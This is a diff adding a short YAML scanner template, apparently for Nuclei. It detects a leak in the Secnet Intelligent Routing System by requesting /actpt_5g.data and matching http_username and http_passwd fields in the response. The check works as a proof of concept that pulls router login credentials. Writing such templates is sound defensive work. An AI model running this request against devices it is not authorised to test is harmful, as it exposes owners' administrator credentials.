@@ -1,0 +1,32 @@
+id: poc-yaml-secnet-actpt-5g-data-info-leak
+info:
+  name: Secnet Intelligent Routing System actpt_5g.data Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "/actpt_5g.data"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"http_username\""
+        part: body
+      - type: word
+        words:
+          - "\"http_passwd\""
+        part: body
+      - type: word
+        words:
+          - "HTTPD_ac"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
